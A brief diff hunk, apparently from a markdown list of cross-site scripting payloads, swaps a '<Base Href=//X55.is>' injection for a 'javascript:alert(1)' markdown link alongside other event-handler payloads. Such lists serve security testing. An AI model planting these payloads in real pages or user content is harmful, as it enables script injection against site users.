@@ -59,7 +59,7 @@ JavaScript:alert(1)
 <K OnPointerRawUpdate=alert(1)>
 ```
 ```
-<Base Href=//X55.is>
+[click here](javascript:alert(1))
 ```
 
 ---
